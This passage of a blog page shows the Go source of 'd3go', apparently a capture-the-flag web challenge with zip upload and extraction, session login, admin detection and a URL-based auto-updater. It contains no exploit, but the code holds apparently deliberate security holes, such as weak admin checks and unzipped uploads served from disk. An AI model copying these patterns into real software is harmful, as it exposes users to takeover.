class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> err := server.Serve(state.Listener); err != <span class="literal">nil</span> &amp;&amp; err != http.ErrServerClosed &#123;</span><br><span class="line">log.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br><span class="line">&lt;-state.GracefulShutdown</span><br><span class="line"><span class="keyword">if</span> err := server.Shutdown(<span class="literal">nil</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">config.Init()</span><br><span class="line">db.Init()</span><br><span class="line"><span class="keyword">if</span> config.Conf.AutoUpdate &#123;</span><br><span class="line">log.Printf(<span class="string">&quot;Auto update enabled&quot;</span>)</span><br><span class="line">err := overseer.RunErr(overseer.Config&#123;</span><br><span class="line">Program: prog,</span><br><span class="line">Address: <span class="string">&quot;:8080&quot;</span>,</span><br><span class="line">Fetcher: &amp;config.Fetch,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">r := gin.Default()</span><br><span class="line">InitRouter(r)</span><br><span class="line"><span class="keyword">if</span> err := r.Run(<span class="string">&quot;:8080&quot;</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">InitRouter</span><span class="params">(r *gin.Engine)</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> rad [<span class="number">32</span>]<span class="type">byte</span></span><br><span class="line">rand.Read(rad[:])</span><br><span class="line">store := cookie.NewStore(rad[:])</span><br><span class="line">r.Use(sessions.Sessions(<span class="string">&quot;mysession&quot;</span>, store))</span><br><span class="line">r.POST(<span class="string">&quot;/login&quot;</span>, controller.Login)</span><br><span class="line">r.POST(<span class="string">&quot;/register&quot;</span>, controller.Register)</span><br><span class="line">r.GET(<span class="string">&quot;/*filepath&quot;</span>, ServeFile)</span><br><span class="line">r.HEAD(<span class="string">&quot;/*filepath&quot;</span>, ServeFile)</span><br><span class="line">admin := r.Group(<span class="string">&quot;/admin&quot;</span>)</span><br><span class="line">admin.Use(middleware.Auth())</span><br><span class="line">admin.POST(<span class="string">&quot;/upload&quot;</span>, controller.Upload)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ServeFile</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line"><span class="comment">// unzipped file server</span></span><br><span class="line">p := c.Param(<span class="string">&quot;filepath&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> strings.HasPrefix(p, <span class="string">&quot;/unzipped&quot;</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(p) == <span class="number">9</span> &#123;</span><br><span class="line">p = <span class="string">&quot;/&quot;</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">p = p[<span class="number">9</span>:]</span><br><span class="line">&#125;</span><br><span class="line">c.FileFromFS(p, http.Dir(<span class="string">&quot;./unzipped&quot;</span>))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// embed static file server</span></span><br><span class="line">p = <span class="string">&quot;/static/&quot;</span> + c.Param(<span class="string">&quot;filepath&quot;</span>)</span><br><span class="line">c.FileFromFS(p, http.FS(Static))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>config.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> config</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;github.com/fsnotify/fsnotify&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/jpillora/overseer/fetcher&quot;</span></span><br><span class="line">log <span class="string">&quot;github.com/sirupsen/logrus&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/spf13/viper&quot;</span></span><br><span class="line"><span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> Conf config</span><br><span class="line"><span class="keyword">var</span> Fetch fetcher.HTTP</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> config <span class="keyword">struct</span> &#123;</span><br><span class="line">NoAdminLogin <span class="type">bool</span></span><br><span class="line">DBUser       <span class="type">string</span></span><br><span class="line">DBPasswd     <span class="type">string</span></span><br><span class="line">DBHost       <span class="type">string</span></span><br><span class="line">DBPort       <span class="type">string</span></span><br><span class="line">AutoUpdate   <span class="type">bool</span></span><br><span class="line">UpdateUrl    <span class="type">string</span></span><br><span class="line">UpdateTime   time.Duration</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Init</span><span class="params">()</span></span> &#123;</span><br><span class="line">viper.SetConfigName(<span class="string">&quot;config&quot;</span>)</span><br><span class="line">viper.SetConfigType(<span class="string">&quot;yaml&quot;</span>)</span><br><span class="line">viper.AddConfigPath(<span class="string">&quot;.&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err := viper.ReadInConfig(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line">UpdateConfig()</span><br><span class="line">viper.OnConfigChange(<span class="function"><span class="keyword">func</span><span class="params">(in fsnotify.Event)</span></span> &#123;</span><br><span class="line">UpdateConfig()</span><br><span class="line">&#125;)</span><br><span class="line">viper.WatchConfig()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">UpdateConfig</span><span class="params">()</span></span> &#123;</span><br><span class="line">Conf.DBUser = viper.GetString(<span class="string">&quot;database.user&quot;</span>)</span><br><span class="line">Conf.DBPasswd = viper.GetString(<span class="string">&quot;database.password&quot;</span>)</span><br><span class="line">Conf.DBHost = viper.GetString(<span class="string">&quot;database.host&quot;</span>)</span><br><span class="line">Conf.DBPort = viper.GetString(<span class="string">&quot;database.port&quot;</span>)</span><br><span class="line">Conf.NoAdminLogin = viper.GetBool(<span class="string">&quot;server.noAdminLogin&quot;</span>)</span><br><span class="line">Conf.AutoUpdate = viper.GetBool(<span class="string">&quot;update.enabled&quot;</span>)</span><br><span class="line">Fetch = fetcher.HTTP&#123;</span><br><span class="line">URL:      viper.GetString(<span class="string">&quot;update.url&quot;</span>),</span><br><span class="line">Interval: viper.GetDuration(<span class="string">&quot;update.interval&quot;</span>) * time.Second,</span><br><span class="line">&#125;</span><br><span class="line">Fetch.Init()</span><br><span class="line">log.Println(<span class="string">&quot;config updated&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>controller.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> controller</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;d3go/model&quot;</span></span><br><span class="line"><span class="string">&quot;d3go/service/auth&quot;</span></span><br><span class="line"><span class="string">&quot;d3go/service/upload&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-contrib/sessions&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/google/uuid&quot;</span></span><br><span class="line"><span class="string">&quot;path&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Resp <span class="keyword">struct</span> &#123;</span><br><span class="line">StatusCode <span class="type">int</span>    <span class="string">`json:&quot;status_code&quot;`</span></span><br><span class="line">StatusMsg  <span class="type">string</span> <span class="string">`json:&quot;status_msg,omitempty&quot;`</span></span><br><span class="line">Data       any    <span class="string">`json:&quot;data&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ErrFormatError = <span class="string">&quot;format error&quot;</span></span><br><span class="line"><span class="keyword">var</span> ErrInternalServer = <span class="string">&quot;internal server error&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Login</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">u := &amp;model.User&#123;&#125;</span><br><span class="line">err := c.ShouldBindJSON(u)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(<span class="number">200</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">-1</span>,</span><br><span class="line">StatusMsg:  ErrFormatError,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">permission, err := auth.Login(u)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(<span class="number">200</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">-1</span>,</span><br><span class="line">StatusMsg:  ErrInternalServer,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">session := sessions.Default(c)</span><br><span class="line"><span class="keyword">switch</span> permission &#123;</span><br><span class="line"><span class="keyword">case</span> auth.UnAuthed:</span><br><span class="line">c.JSON(<span class="number">200</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">-1</span>,</span><br><span class="line">StatusMsg:  <span class="string">&quot;login fail&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">case</span> auth.User:</span><br><span class="line">session.Set(<span class="string">&quot;admin&quot;</span>, <span class="literal">false</span>)</span><br><span class="line">session.Save()</span><br><span class="line">c.JSON(<span class="number">200</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">0</span>,</span><br><span class="line">StatusMsg:  <span class="string">&quot;login success&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">case</span> auth.Admin:</span><br><span class="line">session.Set(<span class="string">&quot;admin&quot;</span>, <span class="literal">true</span>)</span><br><span class="line">session.Save()</span><br><span class="line">c.JSON(<span class="number">200</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">0</span>,</span><br><span class="line">StatusMsg:  <span class="string">&quot;login as admin success&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Register</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> u model.User</span><br><span class="line">err := c.ShouldBindJSON(&amp;u)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(<span class="number">200</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">-1</span>,</span><br><span class="line">StatusMsg:  ErrFormatError,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">err = auth.Register(&amp;u)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(<span class="number">200</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">-1</span>,</span><br><span class="line">StatusMsg:  ErrInternalServer,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">c.JSON(<span class="number">200</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">0</span>,</span><br><span class="line">StatusMsg:  <span class="string">&quot;register success&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Upload</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">f, err := c.FormFile(<span class="string">&quot;file&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(<span class="number">500</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">-1</span>,</span><br><span class="line">StatusMsg:  <span class="string">&quot;upload fail&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (f.Header.Get(<span class="string">&quot;Content-Type&quot;</span>) != <span class="string">&quot;application/zip&quot;</span> &amp;&amp; f.Header.Get(<span class="string">&quot;Content-Type&quot;</span>) != <span class="string">&quot;application/x-zip-compressed&quot;</span>) || path.Ext(f.Filename) != <span class="string">&quot;.zip&quot;</span> &#123;</span><br><span class="line">c.JSON(<span class="number">500</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">-1</span>,</span><br><span class="line">StatusMsg:  <span class="string">&quot;not a zip file&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">uu := uuid.New()</span><br><span class="line"></span><br><span class="line">zipPath := path.Join(<span class="string">&quot;upload&quot;</span>, uu.String()+<span class="string">&quot;.zip&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err := c.SaveUploadedFile(f, zipPath); err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(<span class="number">500</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">-1</span>,</span><br><span class="line">StatusMsg:  <span class="string">&quot;save zip fail&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tree, err := upload.Unzip(zipPath, path.Join(<span class="string">&quot;unzipped&quot;</span>, uu.String()))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(<span class="number">500</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">-1</span>,</span><br><span class="line">StatusMsg:  <span class="string">&quot;upload fail&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">c.JSON(<span class="number">200</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">0</span>,</span><br><span class="line">StatusMsg:  <span class="string">&quot;upload success&quot;</span>,</span><br><span class="line">Data:       tree.Children,</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>db.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> db</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;d3go/config&quot;</span></span><br><span class="line"><span class="string">&quot;d3go/model&quot;</span></span><br><span class="line"><span class="string">&quot;encoding/hex&quot;</span></span><br><span class="line"><span class="string">&quot;errors&quot;</span></span><br><span class="line">log <span class="string">&quot;github.com/sirupsen/logrus&quot;</span></span><br><span class="line"><span class="string">&quot;math/rand&quot;</span></span><br><span class="line"><span class="string">&quot;time&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;gorm.io/driver/mysql&quot;</span></span><br><span class="line"><span class="string">&quot;gorm.io/gorm&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ErrDatabase = errors.New(<span class="string">&quot;database error&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> db *gorm.DB</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Init</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> err := tryOpen(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line">err := db.AutoMigrate(&amp;model.User&#123;&#125;)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// create admin</span></span><br><span class="line">rand.Seed(time.Now().UnixMicro())</span><br><span class="line"><span class="keyword">var</span> rad [<span class="number">32</span>]<span class="type">byte</span></span><br><span class="line">rand.Read(rad[:])</span><br><span class="line"><span class="keyword">if</span> ok, _ := IsFirstRegistered(); ok &#123;</span><br><span class="line">db.Save(&amp;model.User&#123;</span><br><span class="line">Username: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">Password: hex.EncodeToString(rad[:]),</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">tryOpen</span><span class="params">()</span></span> <span class="type">error</span> &#123;</span><br><span class="line"><span class="keyword">var</span> err <span class="type">error</span></span><br><span class="line"><span class="keyword">var</span> database *gorm.DB</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">100</span>; i++ &#123;</span><br><span class="line">database, err = gorm.Open(mysql.Open(config.Conf.DBUser+<span class="string">&quot;:&quot;</span>+config.Conf.DBPasswd+<span class="string">&quot;@tcp(&quot;</span>+config.Conf.DBHost+<span class="string">&quot;:&quot;</span>+config.Conf.DBPort+<span class="string">&quot;)/db?parseTime=True&quot;</span>), &amp;gorm.Config&#123;&#125;)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">time.Sleep(time.Second * <span class="number">3</span>)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">db = database</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">IsAdmin</span><span class="params">(u *model.User)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line"><span class="keyword">var</span> admin model.User</span><br><span class="line"><span class="keyword">if</span> err := db.First(&amp;admin).Error; err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Error(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> u.Username == admin.Username</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">AddUser</span><span class="params">(u *model.User)</span></span> <span class="type">error</span> &#123;</span><br><span class="line"><span class="keyword">if</span> err := db.Save(u).Error; err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.WithField(<span class="string">&quot;user&quot;</span>, u).Error(err)</span><br><span class="line"><span class="keyword">return</span> ErrDatabase</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">CheckAuth</span><span class="params">(u *model.User)</span></span> (<span class="type">bool</span>, <span class="type">error</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> err := db.Where(<span class="string">&quot;username = ? AND password = ?&quot;</span>, u.Username, u.Password).First(&amp;u).Error; err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">if</span> errors.Is(err, gorm.ErrRecordNotFound) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line">log.WithField(<span class="string">&quot;user&quot;</span>, u).Error(err)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>, ErrDatabase</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">IsFirstRegistered</span><span class="params">()</span></span> (<span class="type">bool</span>, <span class="type">error</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> err := db.First(&amp;model.User&#123;&#125;).Error; err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">if</span> errors.Is(err, gorm.ErrRecordNotFound) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line">log.WithField(<span class="string">&quot;user&quot;</span>, model.User&#123;&#125;).Error(err)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>, ErrDatabase</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>auth.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> auth</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;d3go/config&quot;</span></span><br><span class="line"><span class="string">&quot;d3go/db&quot;</span></span><br><span class="line"><span class="string">&quot;d3go/model&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">UnAuthed <span class="type">int</span> = <span class="literal">iota</span> - <span class="number">1</span></span><br><span class="line">User</span><br><span class="line">Admin</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Login</span><span class="params">(u *model.User)</span></span> (<span class="type">int</span>, <span class="type">error</span>) &#123;</span><br><span class="line">ok, err := db.CheckAuth(u)</span><br><span class="line"><span class="keyword">if</span> !ok || err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> UnAuthed, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> config.Conf.NoAdminLogin &amp;&amp; u.ID == <span class="number">1</span> &#123;</span><br><span class="line"><span class="keyword">return</span> UnAuthed, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> db.IsAdmin(u) &#123;</span><br><span class="line"><span class="keyword">return</span> Admin, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> User, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Register</span><span class="params">(u *model.User)</span></span> <span class="type">error</span> &#123;</span><br><span class="line"><span class="keyword">return</span> db.AddUser(u)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>upload.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 